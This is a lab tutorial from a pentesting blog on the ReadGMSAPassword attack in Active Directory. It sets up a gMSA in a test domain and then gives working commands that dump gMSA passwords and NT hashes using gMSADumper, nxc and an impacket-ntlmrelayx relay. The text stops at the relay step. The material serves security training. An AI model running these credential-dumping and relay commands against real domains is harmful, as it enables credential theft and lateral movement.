<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/credential-dumping/" rel="category tag">Credential Dumping</a>, <a href="https://www.hackingarticles.in/category/red-teaming/domain-credential/" rel="category tag">Domain Credential</a></span>            </div>
            <h1 class="post-title entry-title">Credential Dumping: GMSA</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/readgmsapassword-attack/" rel="bookmark"><time class="entry-date published" datetime="2025-04-06T11:49:47+00:00">April 6, 2025</time><time class="updated" datetime="2025-06-24T19:34:20+00:00">June 24, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong>ReadGMSAPassword Attack</strong> is a technique where attackers abuse misconfigured <strong>Group Managed Service Accounts (gMSA)</strong> to retrieve their passwords. In <strong>Active Directory</strong>, <strong data-start="796" data-end="816">ReadGMSAPassword</strong> should only be granted to specific systems.. However, if these permissions are misconfigured, an attacker with access to a machine that can query the gMSA password can extract it and use it to authenticate as that service account. Once obtained, the <strong>gMSA credentials</strong> can be used for lateral movement, privilege escalation, and persistence within the domain. This method is widely known as the ReadGMSAPassword attack and is part of a broader category of credential abuse techniques. Moreover, attackers can also perform <strong>Pass-the-Hash (PtH) or Overpass-the-Hash attacks</strong> using the extracted <strong>NT hash</strong> of the gMSA password, allowing them to impersonate the account and access other network resources. Therefore, properly securing gMSA permissions and monitoring account access is crucial to preventing this attack.</span></p>
<p><span style="color: #000000;">This guide will provide an in-depth explanation of the ReadGMSAPassword attack, including its working mechanism, the key attributes involved, and how attackers exploit it. Additionally, we will demonstrate an attack scenario where an attacker manipulates delegation settings to gain control over a privileged account.</span></p>
<h3><span style="color: #800000;">Table of Contents</span></h3>
<ul>
<li><span style="color: #000000;">Understanding Group of GMSA</span></li>
<li><span style="color: #000000;">Prerequisites</span></li>
<li><span style="color: #000000;">Lab Setup</span></li>
<li><span style="color: #000000;">Exploitation Phase</span></li>
<li><span style="color: #000000;">Bloodhound – Hunting for Weak Permission</span></li>
</ul>
<p><strong><span style="color: #000000;">Method for Exploitation – Use Alternate Authentication Material: Pass the Hash (T1550.002)</span></strong></p>
<ul>
<li><span style="color: #000000;">gMSADumper</span></li>
<li><span style="color: #000000;">nxc</span></li>
<li><span style="color: #000000;">ntlmrelayx</span></li>
<li><span style="color: #000000;">ldap_shell</span></li>
<li><span style="color: #000000;">GMSAPasswordReader</span></li>
</ul>
<p><span style="color: #000000;">Post Exploitation</span></p>
<p><span style="color: #000000;">Detection &amp; Mitigation</span></p>
<h3><span style="color: #800000;">Understanding Group Managed Service Account (gMSA)</span></h3>
<p><span style="color: #000000;">A Group Managed Service Account (gMSA) is a special type of Active Directory (AD) account that administrators use to run automated services securely. Microsoft introduced it in Windows Server 2012 to solve the common problem of managing service account passwords. Unlike traditional service accounts, where administrators often set passwords manually and rarely update them, gMSAs allow Active Directory to manage passwords automatically.</span></p>
<h4><span style="color: #000000;">Why Do We Need gMSAs?</span></h4>
<p><span style="color: #000000;">Before gMSAs, administrators often used regular user accounts for services, but this led to major security risks:</span></p>
<ul>
<li><span style="color: #000000;"><strong>Weak or Unchanged Passwords</strong>: Service account passwords were rarely rotated, making them vulnerable to brute-force and credential theft attacks.</span></li>
<li><span style="color: #000000;"><strong>Manual Management:</strong> Admins had to manually change service account passwords, which was error-prone and difficult to scale.</span></li>
<li><span style="color: #000000;"><strong>Kerberoasting Attacks:</strong> Service account passwords could be cracked if an attacker obtained a Kerberos ticket.</span></li>
</ul>
<h4><span style="color: #000000;">How gMSAs Improve Security</span></h4>
<ul>
<li><span style="color: #000000;"><strong>Automatic Password Rotation:</strong> AD generates and updates a complex password every 30 days (default setting).</span></li>
<li><span style="color: #000000;"><strong>No Manual Password Management:</strong> Administrators never need to know or manage the password.</span></li>
<li><span style="color: #000000;"><strong>Multiple Machines Can Use a gMSA:</strong> Unlike normal service accounts, multiple computers can use the same gMSA securely.</span></li>
</ul>
<h4><span style="color: #000000;">How gMSAs Work – Key Concepts</span></h4>
<ul>
<li><span style="color: #000000;"><strong>Automatic Password Generation:</strong> The Key Distribution Service (KDS) root key in AD is responsible for generating gMSA passwords.</span></li>
<li><span style="color: #000000;"><strong>Password Storage:</strong> The password is stored in an attribute called <strong>msDS-ManagedPassword</strong>, which only authorized users and machines can retrieve.</span></li>
<li><span style="color: #000000;"><strong>Access Control:</strong> The <strong>msDS-GroupMSAMembership</strong> attribute defines which accounts can retrieve the password.</span></li>
</ul>
<h4><span style="color: #000000;">Key Attributes of gMSA</span></h4>
<p><span style="color: #000000;">A gMSA has special Active Directory attributes that store its information:</span></p>
<ul>
<li><span style="color: #000000;"><strong>msDS-ManagedPassword</strong> – Stores the current and previous gMSA passwords in encrypted form.</span></li>
<li><span style="color: #000000;"><strong>msDS-ManagedPasswordID</strong> – Stores the key ID used to generate the current password.</span></li>
<li><span style="color: #000000;"><strong>msDS-ManagedPasswordPreviousID</strong> – Stores the key ID used to generate the previous password.</span></li>
<li><span style="color: #000000;"><strong>msDS-GroupMSAMembership</strong> – Defines which users/computers can request the password.</span></li>
<li><span style="color: #000000;"><strong>msDS-ManagedPasswordInterval</strong> – Defines how often (in days) the password changes (default: 30 days).</span></li>
</ul>
<h4><span style="color: #000000;">How Attackers Can Abuse gMSAs – ReadGMSAPassword</span></h4>
<p><span style="color: #000000;">This privilege allows you to read the password for a Group Managed Service Account (GMSA). </span></p>
<p><span style="color: #000000;">The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. However, an attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.</span></p>
<p><span style="color: #000000;">While gMSAs improve security, attackers can still abuse <strong data-start="989" data-end="1009">ReadGMSAPassword attack</strong> if misconfigurations are present.</span></p>
<ul>
<li><span style="color: #000000;"><strong>Stealing the gMSA Password</strong>: If an attacker has access to a machine that can retrieve the gMSA password, they can extract it using PowerShell or LDAP queries. The extracted password can then be used to authenticate as the gMSA.</span></li>
<li><span style="color: #000000;"><strong>Pass-the-Hash (PtH) Attacks</strong>: Once an attacker gets the NT hash of the gMSA password, they can perform a Pass-the-Hash attack to gain access to systems.</span></li>
<li><span style="color: #000000;"><strong>Overpass-the-Hash (Pass-the-Ticket) Attacks</strong>: Attackers can convert the extracted NT hash into a Kerberos ticket and use it to impersonate the gMSA.</span></li>
<li><span style="color: #000000;"><strong>Running Malicious Services</strong>: If an attacker has control over a computer that can use a gMSA, they can create a malicious service or scheduled task that runs as the gMSA, gaining elevated access.</span></li>
</ul>
<p><span style="color: #000000;">As a result, this misuse of the <strong data-start="1071" data-end="1091">ReadGMSAPassword</strong> <strong>attack</strong> vector enables attackers to steal service account credentials and gain unauthorized access.</span></p>
<h3><span style="color: #800000;">Prerequisites</span></h3>
<ul>
<li><span style="color: #000000;">Windows Server 2019 as Active Directory</span></li>
<li><span style="color: #000000;">Kali Linux</span></li>
<li><span style="color: #000000;">Tools: Bloodhound, Impacket, gMSADumper, nxc, Ldap_Shell, GMSAPasswordReader</span></li>
<li><span style="color: #000000;">Windows 10/11 – As Client</span></li>
</ul>
<h3><span style="color: #800000;">Lab Setup</span></h3>
<h4><span style="color: #000000;">Create the AD Environment:</span></h4>
<p><span style="color: #000000;">To simulate an Active Directory environment, you will need a Windows Server as a Domain Controller (DC) and a client machine (Windows or Linux) where you can run enumeration and exploitation tools.</span></p>
<h4><span style="color: #000000;">Domain Controller:</span></h4>
<ul>
<li><span style="color: #000000;">Install Windows Server (2016 or 2019 recommended).</span></li>
<li><span style="color: #000000;">Promote it to a Domain Controller by adding the <strong>Active Directory Domain Services</strong></span></li>
<li><span style="color: #000000;">Set up the domain (e.g., <strong>local</strong>).</span></li>
</ul>
<h4><span style="color: #000000;">User Accounts:</span></h4>
<ul>
<li><span style="color: #000000;">Create a standard user account named<strong> Komal</strong>.</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user komal Password@1 /add /domain</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisR5JXX3-0KxoPH17rnKyjsoXCvfL4b0JtH9DMKUlt7ESM3G6m8CIqfwQypvinTUXjj6zZqITGX4ql7k12jTpDHCKyRB2NdeugPhHM1eXKL5e_7OsmhR9ClPomRO_aiP2c1Dkp-zSAeqDSkoLviaYZt3An-XAEaOUl6nTqr_W_fvgJJIPZTggGTInf1bw2/s16000/1.png"/></strong></span></p>
<h4><span style="color: #000000;">Set up gMSA on the Domain Controller Computer</span></h4>
<h5><span style="color: #000000;"><strong>Create a security group for gMSA Access:</strong></span></h5>
<p><span style="color: #000000;">Open Active Directory Users and Computers (ADUC). Right-click on Groups → Click New → Group.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEij7xiUe58Q_43szWyFfpZduq9w4XFvxLbqzVKSbMRo2sbS3PyycYGgp6As9kaXmP3Um5zjTu-P_8NmIJqgCLHw2eHdcNMP55-JOZLI5VVSUywShXknO3v1yDjfbDc2rMd-1Yszf1i9GmVVxpa4ep-8Dz-HCx3jV7dXAldHmXDZ3uT7oixpMEjqyt7qGwyG/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Name the group (e.g., <strong>gmsa_Group</strong>). Set <strong>Group Scope</strong> to <strong>Global</strong> and <strong>Group Type</strong> to <strong>Security</strong>. Click OK to create the group.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWiwOJUQi_AEol6MPELwCixUKKysv7zqdTgZeIQc-8yYI355O_tD6H9D1BMTf3ypH9RdYypTjiJFT5k6_ZjTGsHRFVtKuPcy54MWFCEi927ZWGrWDkWmKEyJ3j45UBgLVHxz5XKlyPyTvXKHCrma95Yx3dhAfW2494XNdiByQ8gX84_obic9rEQKZRXS4h/s16000/3.png"/></span></p>
<h5><strong><span style="color: #000000;">Add required user and computer in this group:</span></strong></h5>
<p><span style="color: #000000;"><strong> </strong>Computers using gMSA <strong>must</strong> be in this group, or they won’t be able to retrieve the password. Here in this case computer name is <strong>MSEDGEWIN10, </strong>and user name is<strong> Komal.</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">net group "gmsa_group" "komal" /add /domain
net group "gmsa_group" "MSEDGEWIN10$" /add /domain</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj63nTSzkLjfG5aP2ijvtBmDe5vj2ZDDYX7QBcks2REI3JaGRF4oGqDwLAV0LAtQgvJLEYTTObaJ4Rj5gQv8JWFU6uTGBVhAPkYy0p4lVtwrfO_ZweN_CWWVCv4yNriTOCb7FCqOKmNoyOtI2cgEQqOzSIoaF1jkX_qTqtWHEeFFd1bFULPzMQ48nj5zwPs/s16000/4.png"/></span></p>
<h5><strong><span style="color: #000000;">Create a KDS Root Key in the Domain:</span></strong></h5>
<p><span style="color: #000000;">The <strong>Key Distribution Service (KDS) Root Key</strong> is a cryptographic key in <strong>Active Directory (AD)</strong> that facilitates the secure generation and distribution of passwords for <strong>Group Managed Service Accounts (gMSA)</strong>. It is stored within AD and ensures that only authorized <strong>Domain Controllers (DCs)</strong> can generate and manage gMSA passwords. This key plays a crucial role in maintaining the integrity and security of automatic password management within an AD environment.</span></p>
<p><span style="color: #000000;">The <strong>KDS Root Key</strong> is essential because gMSAs rely on <strong>automatic password rotation</strong> without manual intervention. To achieve this, AD requires a <strong>secure and consistent method</strong> to create and distribute these passwords across multiple DCs. The KDS Root Key ensures that all DCs use the <strong>same cryptographic algorithm</strong> to generate gMSA passwords, preventing discrepancies. Additionally, it restricts password access only to authorized DCs, reducing the risk of unauthorized retrieval or credential theft. Without the KDS Root Key, gMSAs <strong>cannot function</strong>, making it a mandatory component in any gMSA deployment.</span></p>
<p><span style="color: #000000;">To create a KDS Root Key, you run the following PowerShell command on a <strong>Domain Controller</strong></span></p>
<p><span style="color: #000000;">This command creates a new <strong>KDS Root Key</strong> in Active Directory and makes it effective immediately by setting the activation time to <strong>10 hours in the past</strong>. This ensures that the key is available for use right away.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Add-KdsRootKey -EffectiveTime ((get-date).addhours(-10))</pre>
<p><span style="color: #000000;">To check if the KDS Root Key is present, run:</span></p>
<h4><span style="color: #000000;">Get-KdsRootKey</span></h4>
<p><span style="color: #000000;">This command retrieves and displays the <strong>existing KDS Root Keys</strong> stored in Active Directory, allowing administrators to verify their presence and status.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-HOL6DsthHD0onERLrxC3WCG3CvT7nnbu92tsZ7kRnxYgEcCt-DXWNGx-n_T45t9UFgGySe6fqyxaBOLFFjRwR3xxFxqUTt9yy1tNlxRuTEto-Cw_NHHR-Y0pBC-l5CdLZ0lfGYXnLiNBtl0VQDlcCBLztjWTwYYdrehQtOGAcANUbcUQsWJm8bt-IZHO/s16000/5.png"/></span></p>
<h5><strong><span style="color: #000000;">Create the gMSA Account:</span></strong></h5>
<p><span style="color: #000000;">Once the <strong>KDS Root Key</strong> is set up, the next step is to create the <strong>Group Managed Service Account (gMSA)</strong> in Active Directory. This is done using the <strong>New-ADServiceAccount</strong> PowerShell cmdlet.</span></p>
<p><span style="color: #000000;">Choose a <strong>unique name</strong> for the gMSA (e.g., MyGMSA1). Assign it to a <strong>specific DNS host</strong> (usually the domain).  Specify a <strong>security group</strong> that contains the computers allowed to retrieve the gMSA password.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">New-ADServiceAccount -Name "MyGMSA" -DNSHostName "dc.ignite.local" -PrincipalsAllowedToRetrieveManagedPassword "gmsa_group"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEaai4oPn883cMRQo_Ixzx5pHElKCzvOzKW-a6BraPI9LRzxjz-REbNGk54XsBnvCbTSCd6nUkpOZThymY9-Skh6ywuxbFdJ63RGOcBMeTLs_s1a3j5sBNNrYehYb8CPu8CJru3fuGKhqW99dQev404oQHiyAT7mQA-ojcr7dRbAa8Fz7gvN3IzHLOgS81/s16000/6.png"/></span></p>
<p><span style="color: #000000;">This command retrieves details of the <strong>gMSA account (MyGMSA1)</strong> and specifically lists the <strong>computers or security groups</strong> allowed to retrieve its password. It helps verify which systems have access to the gMSA credentials for security and troubleshooting purposes.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-ADServiceAccount MyGMSA -Properties PrincipalsAllowedToRetrieveManagedPassword</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhADJwhKA25G8QIMHxBOmif6poNflwt-EnMhpVIoG4HQ3SmwULDdli94wLQ84T_TUayNzdVZjSP-PkMZf3auWMO0n_a-vozBVO3tEvR_AUZe3O68qdNj2WRT-TipI7OSnA25Q0m7cud0J_8mCeR74LyT2UKXsyHe3hsysJ_rObCwpq8_6QzOQnb83O6bAQp/s16000/7.png"/></span></p>
<h5><strong><span style="color: #000000;"><span style="color: #000000;">To verify the gMSA account in AD:</span> </span></strong></h5>
<p><span style="color: #000000;">Open <strong>ADUC</strong>. Navigate to <strong>Managed Service Accounts</strong> under the domain. You should see <strong>MyGMSA</strong> listed.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhborzdUW30dB7V_14fikgxTSTUu9yZuq937RLz6KQlrSyLXtOmJ4ONRkpsU2bkc-fXHIc-yLvO98Ndq-z8EzhmUkXGSl03B8ZMMf6ft-5GqxPCUl2clu8Q7Gwwxh2PDOu1lLGSqbk0ZDtudokokqaIruc4jflmrQwbToRkbHngVk_F7mcBk_8FU3iIwKXP/s16000/8.png"/></span></p>
<p><span style="color: #000000;">The <strong>Remote Management Users</strong> group grants permission to use <strong>WinRM (Windows Remote Management)</strong> and <strong>PowerShell Remoting</strong> on the machine.</span></p>
<p><span style="color: #000000;">By adding a gMSA to this group, services running under the gMSA can remotely execute commands, manage configurations, and interact with the system using <strong>PowerShell Remoting</strong> without requiring interactive logins.</span></p>
<p><span style="color: #000000;">Open <strong>ADUC</strong>. Navigate to <strong>Remote Management Users</strong> under the Users container, right click on it and go to <strong>properties</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqac6IYJOOQ5N3Qt70ya9pQlSbAx30_8NnhigUDlSEnO4Nfm_QxuUdhRqjFDcbm67ODyU-iHjYGJonInndONSHr4kNzt0GMN-c43dgDjMa9Fsjw1y9HHgHWDb9dZNQ5EXCdZ7E0T5EZoZfomAvOpZlFAwko2k76WYzrnwgcU7ZfZWCWIRnoecZLglNXngU/s16000/9.1.png"/></span></p>
<p><span style="color: #000000;">Add MyGMSA account inside the Members tab, click on OK.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgzdS8_n975FDv7qW_RofYBaB8GPf4NzfovBDHdo-VMk0DAKgnX3DoV1ucF6OZe1z6xtfnX-H9ArJeAEUMYC3lrwX8bic7rFZ0bu259zBhZJhiUop-D-thmpOb5VeiN65_bBG8FJH0OJI-W2ojHsPavqapBaOzA-XeczX0t7qhjDbynQLeh-aV1VWxG4HaC/s16000/9.2.png"/></span></p>
<h5><span style="color: #000000;"><strong>Assign an SPN:</strong></span></h5>
<p><span style="color: #000000;">To allow authentication via Kerberos, assign a <strong>Service Principal Name (SPN)</strong></span></p>
<p><span style="color: #000000;">This command registers a <strong>Service Principal Name (SPN)</strong> for the gMSA account <strong>MyGMSA</strong> in the <strong>ignite.local</strong> domain. It allows the account to authenticate using <strong>Kerberos</strong> for the specified service (hackingarticles/ MSEDGEWIN10.ignite.local)</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">setspn -a hackingarticles/MSEDGEWIN10.ignite.local ignite.local\MyGMSA</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgquYBP9-dwoi0XGpnSu5sUiQUAJjSp7SgnHDcjjGVhE6dlB9yJieqw1AKAbY6YI_IVCqSRmUQq8MysH7uyaNWtYj1_XiERyXT9yG2-L56OR0pe0rkMAkXLatcYySolJetZdXmqHhGJaCBAjYrupKQzN8WID7RPEjfapmHdA5s8VDoT1DguroXxBaSfDoS4/s16000/10.png"/></span></p>
<p><span style="color: #800000;"><strong>Install the gMSA on Target Computer (Client Machine: MSEDGEWIN10</strong><strong>)</strong></span></p>
<p><span style="color: #000000;">Computers that need to use the gMSA must install it locally.</span></p>
<p><span style="color: #000000;">Below command installs the <strong>Active Directory PowerShell module</strong> on a Windows machine. You need this module to manage AD objects, including gMSAs, users, and computers. It comes as part of RSAT (Remote Server Administration Tools), so you must install it before running any AD-related cmdlets.<br/>
</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhF00jYGqJOr70KLO_E2cCEucu1sHNovJzZGepDhHPTTn7KoouomqhNEhrF63E8bU4hQuntnismRt2TPrS5RcQ_GGbVzkKWnf30aRPt77OlJ9VqAhWFx2G7p749aNuosIO4zwlcRpZqtf0dm-GY7HaR7DuK7OqXgzobIIBKkk7tKVPSqLRz2Aj3dOkk4qer/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Below command installs the <strong>gMSA account</strong> (MyGMSA) on the local machine, allowing it to retrieve and use the managed password. The machine must be part of the <strong>security group</strong> associated with the gMSA, or the installation will fail.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Install-ADServiceAccount -Identity "MyGMSA"</pre>
<p><span style="color: #000000;">Below command verifies whether the <strong>gMSA account</strong> (MyGMSA) is correctly installed and configured on the local machine. It checks if the machine can retrieve the <strong>gMSA password</strong> and use it for authentication. A successful test confirms that the gMSA is ready for use.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Test-ADServiceAccount -Identity "MyGMSA"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFfw6MXaaSFWY1EvGX0xpwK3j53DlMREnzq3OO0aVcZygwFZ-qxgRxOlJENeZPZHxtUFu-TDfUhIDHdU_6ce2YfhZ288GPBORgqSDdzEQ2VHgxthbl5TAAmclbo1b5h38LbxDvLDuM_zSNZB0vabQlELAeJbDcXRRHVVPD77yaye3u25lCLu7Xt35dX5ej/s16000/13.png"/></span></p>
<p><span style="color: #000000;">The <strong>gMSA</strong> is now fully set up and ready for use.</span></p>
<h3><span style="color: #800000;">Exploitation Phase</span></h3>
<h3><span style="color: #800000;">Bloodhound – Hunting for Weak Permission</span></h3>
<p><span style="color: #000000;"><strong>Use BloodHound to Confirm Privileges</strong>: You can use <strong>BloodHound</strong> to verify that <strong>Komal</strong> can retrieve the password for the GMSA <strong>MYGMSA$@IGNITE.LOCAL</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u komal -p Password@1 -ns 192.168.1.48 -d ignite.local -c All</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjj7jRk9EjG9ENfRbbXQOOezRp0MRkzdKAMiCWjPr7tbFqtdq6qww_-gShWxKexthz6gWhum20aC3XBJevi2cYwX-_jRWV8YRHyqEnjpSdG7NxZ-Gjm3PeXPJL46-a0GEwPN49KVcS4b-Ivjnn_CHJxmNIXpaXnDImMfpmmmIWC7K7k9ZR6vuGxWomHi0vh/s16000/14.png"/></span></p>
<p><span style="color: #000000;">From the graphical representation of Bloodhound, the tester would like to identify the outbound object control for selected user where the group degree of object control value is equal to 1.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjojsdsr_P80L8PJhH5KXEZef1YfeHcjhuHdraLt7AvouGWS0rT9u2yo6SR9YpPh8Ct-nOz5kNE36J2PcgMfwIAwtG4mlukrSGV0GAejaIhhaPL9TTDEzB1aepCibJJG9FXFXYnLEnVpSclNnuYdFwT2vDifXksdh6L-FVWxKtSAl7d3Q7mPdKHPQ7yOid8/s16000/15.png"/></span></p>
<p><span style="color: #000000;">BloodHound helps identify delegation misconfigurations that are commonly exploited using <strong data-start="1337" data-end="1357">ReadGMSAPassword attack</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCccDyo0HilecZyIJnFGkl-ailtugVqrfeyovz1KoghZi7DD4RmSc-4a5ZyNLnZhYxjzBiyQBFKws6hZn6BuclSz4h5Mu9MQyw58ydIhF2vM51Dyk3vYSDt7pY1OdPtoFKLWZSHKuzRmMXM0lc2LhqpjP49pseIRGwYCeTltvXdqt5gz-9qre-HL55AXyk/s16000/16.png"/></span></p>
<p><span style="color: #000000;">MYGMSA$@IGNITE.LOCAL is a Group Managed Service Account. The group GMSA_GROUP@IGNITE.LOCAL can retrieve the password for the GMSA MYGMSA$@IGNITE.LOCAL</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP6Lsz8xsman5G6HAmSIDXm6wZEKP00BSzgUP-RogObtgfVaycrHeWCbv5yVdx2_2B6XjegXMJiblm5vhHV6oVwoMMNw8aASjhpsqNIYVGi3hV2NxvSsgah0xYIu9Vvomadr8k4Pm6qrRM3xZaaFie0cuigzUJpnshX3XwkpcewnczSgt1zpGw-7foKpZb/s16000/17.png"/></span></p>
<h3><span style="color: #800000;">Method for Exploitation – Use Alternate Authentication Material: Pass the Hash (T1550.002)</span></h3>
<p><span style="color: #000000;">An attacker can read the GMSA password of the account this ACE (ReadGMSAPassword) applies to, forming the basis of the ReadGMSAPassword attack.</span></p>
<h4><span style="color: #800000;">gMSADumper</span></h4>
<p><span style="color: #000000;">On UNIX-like systems, gMSADumper (Python) can be used to read and decode gMSA passwords. It supports cleartext NTLM, pass-the-hash and Kerberoas authentications.</span></p>
<p><span style="color: #000000;">Clone the repository:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/micahvandeusen/gMSADumper
cd gMSADumper</pre>
<p><span style="color: #000000;">And, run the script</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 gMSADumper.py -u komal -p Password@1 -d ignite.local -l 192.168.1.48</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8EHQiG35cB-0HA2BTZ-2goNaqs60Ho6ZZK_MNlb-Y1XzV2paoXHxL9HoBvZ3G-Bdgff9Qd31qjSqP7mth65uyh_-kMuV4fqcngFKY3OkL1-yP9OCCJ_8WXxSYMz4e95pGTmWbW3LMdch4fA3hw_-e8RVFNQW0Nx1E5qnlfUNjr8Lxg7C8ixGeIOjTo8Fx/s16000/22.png"/></span></p>
<h4><span style="color: #800000;">nxc</span></h4>
<p><span style="color: #000000;">Alternatvely, nxc tool can used to enumerate Group Managed Service Accounts (gMSA) in Active Directory using LDAP queries</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc ldap ignite.local -u komal -p Password@1 --gmsa</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHen0DOwyq2Or_5hhpfXDvciguNSn1slQVobaPGwJbQwCQxOkHnaVGYENNQd2tO409TkECh2deNsaaluN2i8c9ognM50TWvFyzQ4KmoLWOH1S6ku2BF7HhWiIH0l9P6P0P27qWHTLqFtT1g8pB6uSXSDhH-AWYkyeEcJ71K-1h4NL0Cgf21llESaqBipgD/s16000/24.png"/></span></p>
<h4><span style="color: #800000;">NTLMRelayx</span></h4>
<p><span style="color: #000000;">Users can also run <strong data-start="720" data-end="756">Impacket’s <code data-start="733" data-end="745">ntlmrelayx</code> (Python)</strong> tool to read and decode gMSA passwords.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-ntlmrelayx -t ldaps://192.168.1.48 -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVYSI36MHSmoLmxssp3YTRkJhTcw1dsvG7DFCb-x-rJXPBhXGqI_VGotdtc0_tO7USZ6TiY4KJ0ZPQQLyCcjK2PWl-vn2onxGkElsl1M5Nmi_Q3URv3r_8YV7hkRtLIoFQPBqjonYfiFLZoGyTMSy9yupk0vE2xuaMVvH3Ew6CMCWyg7Meel6wmugFLAWr/s16000/25.png"/></span></p>
<p><span style="color: #000000;">Trigger a callback via browser, using komal user’s credentials</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-eLvbh8a4FIMNK4NIgcw0sfHcivO-XI3GGw1-LdRNhLtKZz-NCM7GedoDjRK4fcxj28QudvqD3MaoB9oJB3dEMd6itZMzhyJRmlkkvlzVEmGj-Qe4NrLCMCKuWx9siYQIE-7Ks3gj0nuxO2cN2kh9yS4eOi2XR0Ttg9b0wzkfIw_VCNxXbou_5Zg0WLAV/s16000/26.png"/></span></p>
<p><span style="color: #000000;">After a brief wait, we receive an HTTP connection from the komal user’s account along with gMSA NTLM credentials.</span></p>
